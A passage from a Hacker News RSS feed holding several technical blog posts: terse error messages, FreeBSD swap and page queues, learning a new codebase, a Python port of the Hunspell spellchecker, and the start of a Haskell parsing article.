<p>Notice the beautifully terse error message.</p>
<p>(And if you're wondering why <code>su</code> just doesn't say <code>incorrect password</code>,
it's probably due to <code>su</code> being incapable of knowing whether it's really
the password that was wrong, or the username, or something else.)</p>
<h3 id="gnu-cat">GNU <code>cat</code></h3>
<p><code>cat</code>'s error on an incorrect path is terse, but not terse enough:</p>
<pre><code>$ cat invalid
cat: invalid: No such file or directory
$
</code></pre>
<p>Why say "no such file or directory"? <code>cat</code> doesn't even read directories!</p>
<p>Solution:</p>
<pre><code>$ cat invalid
cat: invalid: invalid path
</code></pre>
<p><em>more case studies will be added as I find them.</em></p>
<h2 id="conclusion">conclusion</h2>
<p>Terser is better. Software isn't the place to show off your writing skills.</p>
<p>And if you really must include some kind of hint or suggestion, make it
visually separate from the error message.</p>





<br><a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAAAPCAIAAAD8q9/YAAAABGdBTUEAANbY1E9YMgAAAZ9JREFUSMflljFrwkAUx98H6J3N6KbXFjtJJZNIB+Ntds0kdIxDp3boTYJ0UDcLutxXOCfbpejQSRE5+g38CvcVrtCTNJVLiFAKaR4ZwvH+yf3yf+/lAHIYOjfxDTybi+jVvesCwGg0ssoopRjjKZ+Y5O3HtnBayISvduApn2CM42hD5splxeQv3hf9fj/DwI3rRrlcTq4NKSUAdG47RrKRm/ZNO6vACCNjr5SSEAIAlFKlFKUUAAghUkpjcs2thVU9fh5b58Lhy37eWxejKmtynOSwV9MA9556ALBcLrXWhBDf97XW7Cscx1FKcc6FEGYRYRRW9Wq9sj794CZhN3GZvyWxAz883gOAlFIpFZ1bvu+7rhutasYYxtioXt9e1tt1gsNWT+J2HPdp0kuOALY6TCkNgsA4zBjjnO8dRkc4nOCVtYzTOHyUJL6H0b6HhRCO4wBAEARhD7uuu9vttNatVqt6VU3Zw+mB/7qHZ3NRb9RLpVKOpvSUTxA6GQ6HCcCe551fnP2T/3A4ugaDgZW26TWLxWK2T1r5OkvnKj4Bfm7H+J/sGfMAAAAASUVORK5CYII="></a>
<br>


</div></div>]]>
            </description>
            <link>https://tilde.team/~kiedtl/blog/chatterbox/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789837</guid>
            <pubDate>Fri, 15 Jan 2021 11:56:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exploring Swap on FreeBSD]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 11 (<a href="https://news.ycombinator.com/item?id=25789809">thread link</a>) | @rodrigo975
<br/>
January 15, 2021 | https://klarasystems.com/articles/exploring-swap-on-freebsd/ | <a href="https://web.archive.org/web/*/https://klarasystems.com/articles/exploring-swap-on-freebsd/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>




<div>
<p>On modern Unix-like systems such as <strong>FreeBSD</strong>, “<em>swapping</em>” refers to the activity of paging out the contents of memory to a disk and then paging it back in on demand. The page-out activity occurs in response to a lack of free memory in the system: the kernel tries to identify pages of memory that probably will not be accessed in the near future, and copies their contents to a disk for safekeeping until they are needed again. When an application attempts to access memory that has been swapped out, it blocks while the kernel fetches that saved memory from the swap disk, and then resumes execution as if nothing had happened.</p>



<p>All of the above might sound perfectly sensible. After all, disks are typically much larger than RAM, so why not use them to cache infrequently accessed pages of memory? Yet, many experienced system administrators treat swapping as an abnormal activity, a sign of something amiss. This is justifiable: until relatively recently, the disks typically used for swapping had access latencies millions of times higher than RAM. </p>



<p>That is, an application waiting for memory to be paged back in from swap would have to wait for tens of milliseconds while a regular RAM access takes tens of nanoseconds. Heavy usage of swapped-out memory would thus ruin the performance of a system, so swap activity is often taken as a sign that the system needs more RAM or that memory usage needs to be tuned. A common “solution” is to disable swapping entirely, forcing the operating system to resort to other means to free up memory when necessary.</p>



<p>In 2021, cheap SSDs have become commonplace and have performance characteristics much better suited to swapping, so it seems worthwhile to revisit how swapping works in FreeBSD, and try to provide some insight into frequently raised issues.</p>



<h5><strong>Swapping: when and how much?</strong></h5>



<p>Computer systems have a fixed amount of RAM. It is up to the operating system to optimize its usage. Ideally, operating systems would be able to peer into the future to see which data is about to be accessed; with this information they could ensure that the data is available in RAM before it is accessed. Being constrained to the real world, however, they use a set of heuristics which try to predict future memory accesses. An effective and commonly used heuristic is to cache recently accessed data in memory since it is likely to be accessed again, in the near future. When no free memory is available and an application accesses uncached data, FreeBSD determines which memory was least recently accessed and evicts its contents to make room for new data. This algorithm is called Least-Recently Used (LRU).</p>



<p>Note that the kernel cannot simply throw away data[1]; if a copy is not available on disk it must first page out the data before releasing the backing memory. Thus, swap activity is closely tied to LRU.</p>



<p>Implementing LRU precisely comes with a lot of undesirable overhead, so FreeBSD implements an approximation of LRU – it tries to find memory that has not been accessed in a long time, and evicts that. As part of this implementation, FreeBSD partitions the system’s memory into a set of queues: the active, inactive and laundry queues[2]. The sizes of each of these queues is shown by <em>top(1):</em></p>



<pre><code>  Mem: 2591M Active, 6576M Inact, 1389M Laundry, 4155M Wired, 1543M Buf, 1130M Free
  Swap: 8192M Total, 1623M Used, 6569M Free, 19% Inuse
</code></pre>



<div data-columns="3" data-layout="50-25-25"><div>




<div><div>
<p>Did you know?</p>



<h2>You can maximize the <strong>power of your FreeBSD</strong> infrastructure with our <strong>Support Subscription!</strong></h2>




</div></div>




</div></div>



<p>“<em>Wired</em>” pages are not eligible to be paged out and thus do not participate in LRU. Active pages are frequently referenced; typically, they are mapped into one or more process’ address spaces. For example, memory returned by <em>malloc</em>(3) will initially be resident in the active queue. To determine which active pages are no longer being referenced, a kernel process called the “page daemon” periodically examines the recent access history of each page. Unreferenced pages are aged out of the active queue and into the inactive queue.</p>



<p>The inactive queue contains pages that have not been accessed recently. Such pages are good candidates for reuse if the kernel needs to handle a shortage of free memory. The queue helps order pages by recency of access: newly inactive pages are inserted at the tail of the queue, and pages are reclaimed from the head of the queue.</p>



<p>Earlier we noted that a well-behaved operating system must not throw away data when handling a free memory shortage. If some data is in a page of memory and no copy of that data exists in stable storage, then the page is said to be “dirty” and before it can be reused its contents must be paged out to storage. Otherwise, the page is “clean.” For example, if one searches a file using grep(1), that file’s data must be loaded into memory, but because grep(1)merely reads that data, that memory will be clean and can be reused at any point.</p>



<p>The active and inactive queues will contain a mix of clean and dirty pages. When reclaiming memory to alleviate a shortage, the page daemon will free clean pages from the head of the inactive queue. Dirty pages must first be cleaned by paging them out to swap or a file system. This is a lot of work, so the page daemon moves them to the laundry queue for deferred processing. The laundry queue is managed by a dedicated thread, the laundry thread, which is responsible for deciding when and how much to page out. The relationship between these queues is depicted here:</p>



<div><figure><img data-attachment-id="3546" data-permalink="https://klarasystems.com/articles/exploring-swap-on-freebsd/image-4/" data-orig-file="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?fit=340%2C270&amp;ssl=1" data-orig-size="340,270" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-4" data-image-description="" data-medium-file="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?fit=300%2C238&amp;ssl=1" data-large-file="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?fit=340%2C270&amp;ssl=1" loading="lazy" width="340" height="270" src="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?resize=340%2C270&amp;ssl=1" alt="" srcset="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?w=340&amp;ssl=1 340w, https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?resize=300%2C238&amp;ssl=1 300w" sizes="(max-width: 340px) 100vw, 340px" data-recalc-dims="1"></figure></div>



<p><strong>To summarize:</strong></p>



<p>– The page daemon migrates unreferenced pages from the active queue to the inactive queue (1).</p>



<p>– To free up memory, the page daemon scans pages at the head of the inactive queue (2), frees clean pages (6), and moves dirty pages to the tail of the laundry queue (3).</p>



<p>– When the laundry thread decides to clean some dirty pages (4), it hands them to a pager, which writes their contents to stable storage and places the cleaned pages in the inactive queue (6).</p>



<p>– If a page is referenced after it is placed in the inactive or laundry queues, it will lazily be moved back to the active queue.</p>



<p>One possible strategy for the laundry thread is to just do nothing, relying on reclamation of clean pages to satisfy demand for free memory. Indeed, this is effectively what happens when you disable swap altogether. However, pages in the laundry queue are inactive by definition, and unused memory is wasted memory. Another possible strategy is to launder pages as soon as they enter the queue, but this can result in unnecessary I/O.</p>



<p><strong>The policy used by the laundry thread makes use of several signals:</strong></p>



<p>1) The ratio of the lengths of the inactive and laundry queues,</p>



<p>2) the number of clean pages reclaimed since the last set of page-outs, and</p>



<p>3) the size of the inactive queue relative to its target (minimum) size.</p>



<p>The laundry thread uses the first two signals to control “background” laundering, while the third is used to drive “shortfall” laundering.</p>



<p>The idea behind background laundering is to try and ensure that some dirty pages are paged out before a shortage of clean inactive pages occurs. When the system is out of both free pages and clean inactive pages, applications that need free memory are effectively stuck waiting for some page-outs to swap to complete. The laundry thread therefore tries to ensure that the laundry queue does not grow too large: the larger the ratio (1) of queue sizes, the more frequently the laundry thread will perform page-outs of dirty memory. Because it is a waste of I/O bandwidth to page out dirty memory when there is no shortage of free memory, the laundry thread monitors the activity of the page daemon to determine how frequently it should perform page outs.</p>



<h5><strong>Why is my system using so much swap space?</strong></h5>



<p>When a dirty page’s contents have been paged out to swap, the page is marked clean and becomes eligible for reclamation. At this point, the page’s contents exactly match the copy saved to the swap device. (The page could be dirtied again, in which case it was recently accessed and belongs back in the active queue.) Suppose the page is freed, and later an application tries to read the data. A fresh page will be allocated and the data is paged back in from swap, at which point the application can run again and use that data. At this point the page is still clean – only if the data is written to will the page be marked dirty – so the copy in the swap device is still valid and there is no reason to discard it.</p>



<p>More generally, a write-once-read-many access pattern can be common for some types of data. A long-lived process may allocate and write to a region of memory during startup and thereafter only read from that memory, for example. If that memory is paged out, FreeBSD will retain the copy in swap so long as it remains valid. Otherwise, in order to reclaim that memory, it would have to perform another expensive page-out operation.</p>



<p>It is thus common to see moderate swap space usage even when plenty of free memory is available[3]: at some point in the past, demand for free memory triggered page-outs to swap, and the swapped-out data remained valid.</p>



<h5><strong>Why is the kernel killing my processes?</strong></h5>



<p>In some scenarios, shortfall laundering may not be enough to alleviate a shortage of free memory. A process may have a runaway memory leak or the system may be oversubscribed to the point where it becomes completely unresponsive. The laundry thread may be paging out memory as quickly as possible but cannot meet demand, or the swap device may be full. At this point the kernel has little choice but to try and kill processes to reclaim memory and restore stability to the system – the dreaded OOM (out-of-memory) kill.</p>



<p>FreeBSD will trigger OOM kills in a couple of scenarios. First, if the page daemon repeatedly fails to reclaim _any_ pages from the inactive queue, it will eventually trigger OOM kills. If the swap device is full, the laundry thread will be …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://klarasystems.com/articles/exploring-swap-on-freebsd/">https://klarasystems.com/articles/exploring-swap-on-freebsd/</a></em></p>]]>
            </description>
            <link>https://klarasystems.com/articles/exploring-swap-on-freebsd/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789809</guid>
            <pubDate>Fri, 15 Jan 2021 11:53:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Merge timeline of all payment providers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25789403">thread link</a>) | @kinduff
<br/>
January 15, 2021 | https://fabien.mornand.name/payment/ | <a href="https://web.archive.org/web/*/https://fabien.mornand.name/payment/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://fabien.mornand.name/payment/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789403</guid>
            <pubDate>Fri, 15 Jan 2021 11:01:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to join a team and learn a codebase (2020)]]>
            </title>
            <description>
<![CDATA[
Score 96 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25789336">thread link</a>) | @minicaionut
<br/>
January 15, 2021 | https://www.samueltaylor.org/articles/how-to-learn-a-codebase.html | <a href="https://web.archive.org/web/*/https://www.samueltaylor.org/articles/how-to-learn-a-codebase.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<span><a href="https://www.samueltaylor.org/index.html">Home</a> &gt; <a href="https://www.samueltaylor.org/articles/index.html">Articles</a> &gt; new codebase, who dis? (How to Join a Team and Learn a Codebase)</span>

<p>I have switched teams more often than I have had to implement an AVL tree, and you can guess which one of those two was taught in school. I wish someone had taught me how to join a new team! While learning a new codebase can be daunting, I've found a few things that work for me.</p>
<p>You should do at least three things when joining a new team. The order of these three can be whatever you like, but all three should be done as soon as reasonably possible.</p>
<p><strong>First</strong>, you’ll likely set up the development environment. As you do this, pay attention to just what it is that you're setting up. For instance, if you need to get Redis running locally, then that's a good hint that there's some caching happening somewhere. Noting the order in which you run internal projects helps you understand dependencies. If the feature store needs to be running before you bring up the model serving service, that's a hint that the model serving service may depend upon the feature store. Such dependencies start to hint at the overall architecture.</p>
<p>Take notes on the exact commands you’re running and packages you’re installing. You’re bound to run into something that’s changed since the setup docs were written, and being able to correct them is a quick win you can provide to the new team. Plus, it's good to know exactly how you ruined your system installation of Python.</p>
<p>Ideally, the code you're working on should have some sort of automated test suite in place. A good way to start experimenting with and understanding the code is to get that test suite successfully running, then make changes to the codebase completely at random and see what breaks.</p>
<p>The <strong>second</strong> thing you should do is get some overview of the architecture. Some teams will have a document describing this, and if that document is an accurate depiction of reality then you should certainly work to understand it. In any case, asking a more senior person on the team to give you an overview is a good idea. They should know how up-to-date that document is (if it does exist) and also be able to describe and/or draw the architecture for you. Here are some sample questions you can consider asking:</p>
<ul>
<li>What repositories (or portions of repositories) do we own and/or work on most frequently? What do each of them do?</li>
<li>Where does our code run? (e.g. EC2 Instances, Google's Kubernetes Engine, on prem)</li>
<li>What does the deployment pipeline look like? How does a feature get from my laptop to live in production?</li>
<li>Do we have certain services, packages, classes, or files that are a real headache? Areas that are particularly unreliable or error-prone?</li>
<li>Are there external API's, vendors, or products that we use or rely on? (e.g. SendGrid, DataDog, MySQL)</li>
</ul>
<p>Similar to environment setup, an easy thing you can do to help the team is to document that architectural overview (or update the existing document). Write down what you learned, take a picture of the diagrams that were drawn, and post that information somewhere visible to the team. Be sure to put an "as of" date on your changes. Even stable projects exhibit some change over a long enough time period, so this date will help future readers know if they can trust this document.</p>
<p>A <strong>third</strong> thing you should do when starting on a new team is start understanding the business. If you're new to the company, figure out its mission, product offering(s), and goal(s). Then work to understand how your team fits into those things. Some sample questions include:</p>
<ul>
<li>How can our team make an impact on the company's goals?</li>
<li>If our code were to break horrifically, who would get angry? How fast would that happen?</li>
<li>What other teams do we have the most interaction with? What services/codebases do they own? Do we share parts of our codebase with other teams?</li>
</ul>
<p>Without an understanding of the team's place in the company, you're doomed. You won't have sufficient context to execute your work well.</p>
<h2>Mindset</h2>
<p>I strongly believe that learning a new codebase happens best through implementing real features (even if they are small to start with). The whole point of being on this team as an individual contributor is to build stuff, and there is no better way to learn how to do something than by spending quality time doing that exact thing. As you build skill and understanding, you can work on larger and larger projects over time.</p>
<p>Implementing something will require you to read the code. But "read" may be a misleading word here, because reading code is dramatically different from reading a novel. Code is typically organized with more related code being closer together (in the same directory, package, class, or file). Can you imagine a novel written in this way? If Tolkien had placed all scenes of two characters fighting each other in adjacent pages, while all scenes with magic in them occurred in a separate book? How absurd!</p>
<p>Though learning to code taught me the basics of reading code, nobody ever taught me how to read a large codebase. To do so, we must adopt a certain mindset. Balance understanding each intricate detail against making impact quickly. Quick impact helps establish your reputation on the team and gets you to that accurate/intricate understanding faster than trying to read everything up front.</p>
<p>The rule of thumb I use is to understand something just enough to express what it does without necessarily knowing exactly how it does that. This process is called "chunking," and it relies on the fact that once you have a basic understanding of a unit of code, "you don't need to remember all the little underlying details" (Oakley). If you're worried about not understanding everything in minute detail, don't be afraid to take a note to come back and understand that chunk more fully.</p>
<p>This understanding will grow recursively: first, you understand what the various services do. Then, you identify the particular service you need to modify and start to understand the various modules within that service. In the modules you modify, you'll start to understand the classes contained. The base case of this recursive process is the individual line.</p>
<p>Keep in mind that different teams may implement the same concept or pattern in different ways. Understanding why your current team chose the way they did is another way new teammates can help the team. It's totally possible that your new team hasn't heard of the cool way to implement singletons that you like. It's equally possible that your way is worse in some way you didn't know. Either way, someone gets to learn something!</p>
<p>The last mindset recommendation I'll give before we dive into the process is to try to understand the code both in terms of code paths and data flows. Think about which objects know what information and how that information flows between parts of the system.</p>
<h2>Process</h2>
<p>I recommend this process for working in any codebase:</p>
<ol>
<li><strong>Locate the portion of code most relevant to the immediate task</strong> at hand.</li>
<li>Understand that code enough to <strong>form a hypothesis</strong> about the change you need to make.</li>
<li>Make that change and <strong>test your hypothesis</strong>. Sometimes the best way will be to click around in the UI or run a particular script. Sometimes the easiest path is to write a test that describes the behavior you're after.</li>
<li>If your hypothesis was incorrect, return to step 2. Understand why that change didn't do what you thought it would, and develop a new hypothesis.</li>
<li>Once you have working code, <strong>improve its quality</strong>. Write a test (or a few) that document the changes in behavior you made. Refactor your code for clarity and style.</li>
</ol>
<p>This scientific approach guides us gradually toward correct, high quality code without having to understand each and every bit of code around our change.</p>
<h2>Tools</h2>
<p>While you could certainly get by with just a text editor and some patience, a wide variety of tools exist that help us read code more effectively throughout the process identified above.</p>
<h3>Identifying relevant code</h3>
<p>While step one gets easier over time as we build familiarity with some portion of code, we often begin step one completely lost. A few approaches are helpful here: running the code, project search, and code search.</p>
<p>Running the code helps you understand it. Before you start changing things, understand what already exists. This could mean reproducing a bug locally, finding the place in the UI where the new feature will go, or any number of other things. When you do, stepping through the execution in a debugger will give you a strong start on understanding what is going on.</p>
<p>By "project search," I mean searching artifacts created as part of the software development lifecycle. Particularly useful are issue trackers like JIRA/Asana/Pivotal Tracker, pull requests and issues in tools like GitHub and GitLab, and the git history itself. Because few tasks are truly novel, we can often gain understanding by looking for similar past work. Try several different keywords. Sometimes you'll find a pull request that implements something very similar to what you want to do, and you can use that as a guide. Trying to divine something from scratch, while sometimes necessary, requires significantly more effort than adapting from an example.</p>
<p>Code search is just what it sounds like. For code that you have checked out locally, I highly recommend using a tool specifically built for recursive search like ack, Silver Searcher (ag), or ripgrep. But you won't always have every bit of code at the company checked out locally, and sometimes it's useful to be able to search exhaustively. For this use case, tools like OpenGrok or Sourcegraph are super helpful. GitHub and GitLab also offer ways to search all code within a specific organization.</p>
<p>No matter which tool you're using, try several keywords you think might be relevant. Consider changing case sensitivity. You may have better results filtering down to specific file types.</p>
<h3>Understanding code</h3>
<p>Using these various search tools, we arrive at a set of relevant locations. Thus, we arrive into step two of our process: …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.samueltaylor.org/articles/how-to-learn-a-codebase.html">https://www.samueltaylor.org/articles/how-to-learn-a-codebase.html</a></em></p>]]>
            </description>
            <link>https://www.samueltaylor.org/articles/how-to-learn-a-codebase.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789336</guid>
            <pubDate>Fri, 15 Jan 2021 10:54:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rebuilding the spellchecker]]>
            </title>
            <description>
<![CDATA[
Score 140 | Comments 24 (<a href="https://news.ycombinator.com/item?id=25789099">thread link</a>) | @zverok
<br/>
January 15, 2021 | https://zverok.github.io/blog/2021-01-05-spellchecker-1.html | <a href="https://web.archive.org/web/*/https://zverok.github.io/blog/2021-01-05-spellchecker-1.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <h2 id="how-i-decided-to-write-a-spellchecker-and-almost-died-trying">How I decided to write a spellchecker and almost died trying</h2>

<p>A few years ago I had a fun idea for a “weekend project”: pure-Ruby spellchecker. Ruby is my language of choice, and no-dependencies spellchecker seemed a small useful tool for the CI environment: for example, to check comments/docs spelling without installing any third-party software. I actually <em>could’ve</em> pulled out the project in its limited scope (only English, only spot misspelled words without fixing, limited dictionary) with just a flat list of known words, but that’s not what happened.</p>

<p>Back then, I decided to make a moderately generic tool, at least able to work with multiple languages. Fortunately (or so I believed!), there were many already existing and freely available spellchecking dictionaries distributed as LibreOffice and Firefox extensions. All of those dictionaries are in the format defined by the <strong><a href="http://hunspell.github.io/">Hunspell</a></strong> tool/library—which is an open-source library that is used for spellchecking in Libre/OpenOffice, Mozilla products (Firefox, Thunderbird), but also Google Chrome/Chromium, macOS, several Adobe products, and so on.</p>

<p>The dictionaries looked like easy to reuse text files with some (“insignificant” as it seemed) metadata, and the whole “use Hunspell dictionaries from pure Ruby spellchecker” project <em>still</em> felt like a “weekend-long” one, for the first few weekends. Only gradually the underwater complexity of the multilanguage word-by-word spellchecking uncovered. Eventually, I was distracted from the project and abandoned it, but I still had the fascination with the seemingly-simple, actually-mind-blowingly-complicated Hunspell, the software everybody used daily and hardly ever notice.</p>

<p>The idea to dig deeper into it, to <em>understand</em> it and <em>explain</em>, grew on me and bothered me for quite some time. And what is a better way to understand something, if not to retell it in your own words? After several lazy and not very far-progressed attempts to write something Hunspell-alike (twice in Ruby, once in Rust, once in Python), eventually, in February 2020, the task I settled down to solve is: “explanatory rewrite” of the Hunspell into high-level language with a lot of comments. I achieved this goal by December 2020, with the first release of the <a href="https://github.com/zverok/spylls">Spylls</a> project: <strong>the port of Hunspell’s core algorithms into modern, well-documented, well-structured Python</strong>.</p>

<p>And now I want to share some insights of what I uncovered on the road: about spellchecking in general and Hunspell in particular.</p>

<p>In the ongoing article series, I’ll cover these topics:</p>

<ul>
  <li>What is Hunspell, why is it significant, and why try to “explain” it (current article)</li>
  <li>Base spellchecking concepts: lookup and suggest, as seen by Hunspell</li>
  <li>How lookup (checking if the word is correct) works, and why it could be much more complicated than “just look in the list of the known words”</li>
  <li>How suggest (proposed fix for the incorrect word) works, and how hard it is to estimate its quality</li>
  <li>A closer look into Hunspell’s dictionary format. It is the most widespread open dictionary format in the world, and we’ll see what linguistic and algorithmic information it <em>potentially</em> can carry, and what part of it is actually used in existing dictionaries</li>
  <li>Some details on Spylls implementation process and results</li>
  <li>Closing thoughts on the big picture of word-by-word spellchecker problem, and Hunspell’s approach to it</li>
</ul>

<h3 id="what-is-hunspell">What is Hunspell?</h3>

<blockquote>
  <p><strong>Note:</strong> The information on Hunspell’s origins and history is mostly my guesses, following partial and incomplete sources everywhere.</p>
</blockquote>

<p>Hunspell (<small><a href="https://en.wikipedia.org/wiki/Hunspell">Wikpedia article</a></small>), initially <strong>Hun</strong>garian spellchecker, emerged as an alternative for previously existing aspell/ispell/myspell somewhere in 2002 (I guess?). It was created by László Németh, in a need of supporting languages with complicated suffixing/prefixing rules and word compounding (such as Hungarian). Hunspell’s design seemingly proved itself to be flexible enough to support most of the world’s languages, and in a few years, it became the most used spellchecker in the world. You have most probably used it even if you’ve never heard the name before today: Hunspell is the default spellchecking engine in Chrome and Firefox, Libre/OpenOffice, Adobe products, and macOS (not an exhaustive list). Dictionaries in Hunspell format exist for almost all actively used languages for which the concept of word-by-word spellchecking makes sense<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>.</p>

<p>Currently, Hunspell is maintained <a href="https://github.com/hunspell/hunspell">on GitHub</a> (repo has only around 1k stars, will you believe it?). It seems that maintenance is not that easy if you’ll weight the number of open issues and PRs, and the latest commits timeline: at the time of writing it (Jan 2021), the last commit to master was of May 2020, and the last release was 1.7 on Dec 2018. Hunspell’s codebase is mostly “old-school” C++. It is being slowly modernized and it has very few comments; there are thousands of two-branch <code>if</code>s to handle non-Unicode and Unicode text separately. There is also an attempt to rewrite Hunspell from scratch in a modern C++, which at some point was developed under the <code>hunspell</code> GitHub organization. Now it is independent and called <a href="https://github.com/nuspell/nuspell">nuspell</a> (and, while not yet supporting all of the Hunspell features, already “achieved” version 4.2.0).</p>

<p>Obviously, there are open-source spellcheckers other than Hunspell. GNU aspell (that at one point was superseded by Hunspell, but still holds its ground in English suggestion quality), to name one of the older ones; but also there are novel approaches, like <a href="https://github.com/wolfgarbe/SymSpell">SymSpell</a>, claiming to be “1 million times faster” or ML-based <a href="https://github.com/bakwc/JamSpell">JamSpell</a>, claiming to be much more accurate.</p>

<p>And yet, what makes Hunspell stand out is its coverage of the world’s languages. It is not ideal, but the amount of dictionaries ready to use immediately, and amount of <em>experience</em> of dealing with typical problems and corner cases, coded into the codebase, is hard to beat.</p>

<h3 id="why-rewrite-it">Why rewrite it?</h3>

<p>As I’ve already stated above, the goal of the Spylls project was to create an <em>explanatory</em> rewrite: E.g., the “retelling” of how Hunspell works in a way that is easy to follow and to play with.</p>

<p>The necessity of this approach came to me from three facts:</p>

<ol>
  <li>Hunspell is used almost everywhere and is taken for granted;</li>
  <li>It is much more complicated than one might naively expect;</li>
  <li>This complexity—and years of human work that was spent growing the project—is notoriously hard to follow through the Hunspell’s codebase and grasp in full.</li>
</ol>

<p>In other words, I wanted to <strong>make the knowledge behind Hunspell more open</strong>.</p>

<p>The way I have chosen was not, of course, the only one possible. I could’ve just read through the original code and write a series of articles (or, rather, a book?) on how it works. I could’ve thoroughly commented and republished the original source code. But I felt that <em>reimplementing</em> is the only way of understanding what’s and why’s of the algorithms (at least for somebody not being a Hunspell’s core developer); and that implementation in a high-level language will allow focusing on words and language-related algorithms, not memory management or fighting with Unicode.</p>

<blockquote>
  <p>Note that there are also a few “pragmatic” ports of Hunspell into other languages (in order to use it in environments where C++ dependency is undesireable), namely <a href="https://github.com/aarondandy/WeCantSpell.Hunspell">WeCantSpell.Hunspell</a> in C# and <a href="https://github.com/wooorm/nspell">nspell</a> in JS (very incomplete); and aforementioned <a href="https://github.com/nuspell/nuspell">nuspell</a> can also be considered a “port” (from legacy C++ to a modern one).</p>
</blockquote>

<h3 id="why-python">Why Python?</h3>

<p>My language of choice is Ruby. It was also the first language that I’ve tried to port Hunspell into. I’d be happy to proceed with Ruby if my goal has been just a “pragmatic” library. And yet, when I decided that my goal is to make the knowledge of Hunspell’s algorithms accessible to a wide audience, I understood that Ruby is not the best choice: language reputation (slightly esoteric and mostly-for-web) would make my project lest noticeable; and my preferred coding style (mix of OO and functional, with lots of small immutable domain objects and fluent chains of iterators), while allowing me to be very effective, would make the code less accessible to other languages users.</p>

<p>What I needed was a high-level language, with as low boilerplate as possible; as mainstream as possible; as easy to experiment with and prototype as possible. Without diving into too much argument here, Python and modern JavaScript seemed to be the most suitable options, and, to be honest, Python was just closer to my soul. So, here we are!</p>

<p>The code style is mostly imperative (as it corresponds to how Hunspell is structured), with large-ish, but clearly structured methods, and a small number of classes/objects (mostly they are either “whole algorithm as a class” or almost-passive “structs” – or, in Python, dataclasses). I tried to limit myself in the usage of complex Python-specific features (like functools or itertools), but have a decent use of “list comprehensions” (as they are quite readable and Pythonic) and generators (lazy lists). Overall, I wanted the code to be good Python, but not too smart. Whether I succeeded, is up to you to decide.</p>

<p>Currently, <a href="https://github.com/zverok/spylls">Spylls</a> has <strong>≈1.5k lines of library code</strong> in 14 files. It conforms (with <a href="https://spylls.readthedocs.io/en/latest/#completeness">some reservations</a>) to all Hunspell’s integrational tests. Those tests look like a set of files each, consisting of “test dictionary + what words should be considered good, what words should be considered bad, what should be suggested instead of the bad words”, and there are <strong>127 of such sets to pass</strong>. There are <strong>2 thousand comment lines</strong> in the code, explaining thoroughly every detail of the algorithm and rendered at the <a href="https://spylls.readthedocs.io/en/latest/hunspell.html">Spylls documentation site</a>; note that besides docstrings at the beginning of each class and method, there are also inline comments in code—that’s why the documentation site uses custom theme with inline “Show code” feature.</p>

<hr>

<p>With this being said, I am wrapping up the introductory post.</p>

<p><strong>In the <a href="https://zverok.github.io/blog/2021-01-09-spellchecker-2.html">next series</a>: An introduction to Hunspell’s “lookup” and “suggest” concepts; and deeper dive into the lookup.</strong></p>


  </article></div>]]>
            </description>
            <link>https://zverok.github.io/blog/2021-01-05-spellchecker-1.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789099</guid>
            <pubDate>Fri, 15 Jan 2021 10:19:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Permutate Parsers, Don't Validate]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25789061">thread link</a>) | @gbrown_
<br/>
January 15, 2021 | https://juliu.is/permutate-parsers/ | <a href="https://web.archive.org/web/*/https://juliu.is/permutate-parsers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://lexi-lambda.github.io/blog/2019/11/05/parse-don-t-validate/">“Parse, don’t
validate”</a>
has been one of my favourite programming articles for some time. The main
gist of the article is that, when writing in a type-driven fashion, your
snappy slogan should be:</p>
<blockquote>
<p>Parse, don’t validate.</p>
</blockquote>
<p>The core difference between parsing and validating can be explained by
looking at two very similar functions:</p>
<div data-language="haskell"><pre><code><span>parseInt</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>Maybe</span> <span>Int</span>
<span>parseInt</span> <span>str</span> <span>=</span> <span>Text.Read.readMaybe</span> <span>str</span>

<span>validateInt</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>Bool</span>
